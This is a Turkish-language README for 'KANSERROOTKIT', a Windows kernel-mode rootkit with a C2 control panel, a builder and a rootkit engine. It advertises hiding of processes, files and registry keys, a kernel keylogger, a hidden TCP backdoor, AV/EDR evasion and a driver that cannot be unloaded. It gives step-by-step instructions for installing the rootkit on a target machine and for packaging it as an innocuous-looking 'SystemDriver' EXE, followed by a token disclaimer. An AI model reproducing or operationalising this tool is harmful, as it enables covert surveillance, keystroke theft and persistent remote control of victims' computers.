# KANSERROOTKIT v1.0

Kernel-mode (ring-0) rootkit. Windows kernel surucusu yukleyerek process gizleme, dosya gizleme, registry gizleme, keylogger ve backdoor ozellikleri sunar. C2 uzerinden uzaktan yonetilir.

---

## Dosya Yapisi

| Dosya | Aciklama |
|-------|----------|
| `server.py` | Rootkit C2 kontrol paneli (GUI) — bot listesi, kernel komutlari, log izleme |
| `core.py` | Kernel-mode rootkit motoru — driver derleme/yukleme, hooking, gizleme, backdoor |
| `builder.py` | Rootkit EXE builder — C2 adresi gomulu yukleyici olusturur |

---

## Ozellikler

- **Kernel-Mode Driver** — Windows kernel surucusu (ring-0), `DriverUnload` engelli (kaldirilamaz)
- **Process Hiding** — Belirtilen process'leri task manager ve process list'ten gizler
- **File Hiding** — Belirtilen dosya/dizinleri Windows API seviyesinde gizler
- **Registry Hiding** — Registry key'lerini gizler
- **Keylogger** — Kernel seviyesinde klavye dinleme
- **Backdoor** — Gizli TCP backdoor, C2'ye baglanti
- **Anti-Detection** — AV/EDR atlatma, usermode hooking atlatma
- **Persistence** — Boot-time driver yukleme, registry persistence
- **C2 Kontrol** — Base64 kodlu komut kanali:
  - `hide_proc <pid>` — Process gizle
  - `hide_file <path>` — Dosya gizle
  - `hide_reg <key>` — Registry key gizle
  - `keylog_start/stop` — Keylogger kontrol
  - `exec <cmd>` — Gizli komut calistir

---

## Gereksinimler

```bash
cd KanserTools
pip install -r requirements.txt
```

**Windows Driver Kit (WDK)** — Kernel surucusu derlemek icin:
- Visual Studio Build Tools + Windows SDK/WDK
- Veya onceden derlenmis driver (driver.c kodundan `cl.exe` ile)

**Admin Yetkisi** — Driver yuklemek icin Administrator/yuksek yetki gerekir.

---

## Kullanim

### 1. C2 Kontrol Paneli

```bash
cd rootkit
python server.py
```

GUI acilir. Varsayilan port: `8888`. Panel ozellikleri:
- **Bots** sekmesi: Rootkit yuklu bot listesi, sistem bilgisi, kernel durumu
- **Console** sekmesi: Secili rootkit'e kernel komutu gonder (hide/unhide/exec)
- **Logs** sekmesi: Keylogger ciktisi ve hata loglari

### 2. Rootkit Yukleme (Hedef Makine)

```bash
# Admin olarak calistirilmalidir:
python core.py
```

Rootkit motoru calistiginda:
1. C2 sunucuya baglanir
2. Kernel surucusunu derler (veya onceden derlenmis driver'i kullanir)
3. Driver'i yukler (`sc create` + `sc start`)
4. C2'den kernel komutlari bekler
5. Keylogger ve backdoor'u aktif eder

### 3. Builder

```bash
python builder.py
```

C2 adresi ve port girilir, `rootkit_built.py` olusturulur.

---

## EXE Builder (PyInstaller)

```bash
cd rootkit

# Rootkit motorunu EXE yap:
pyinstaller --onefile --noconsole --name=SystemDriver core.py

# C2 sunucuyu EXE yap:
pyinstaller --onefile --name=RootKitC2 server.py
```

---

## Monitor Reporter

`monitor_reporter.py`, rootkit motoru calistiginda otomatik import edilir. Driver yukleme basarisi/basarisizligi, gizleme komutlari, keylogger ciktisi periyodik olarak raporlanir.

```python
from monitor_reporter import report
report("Rootkit", "driver_loaded", {"status": "success", "pid": 1234})
```

---

## Guvenlik Uyarisi

Bu arac **yalnizca kendi sistemlerinizde ve egitim/test amaciyla** kullanilmalidir. Kernel seviyesinde calistigi icin yanlis kullanim sistem kararsizligina (BSOD) yol acabilir. Izinsiz kullanim yasa disidir.
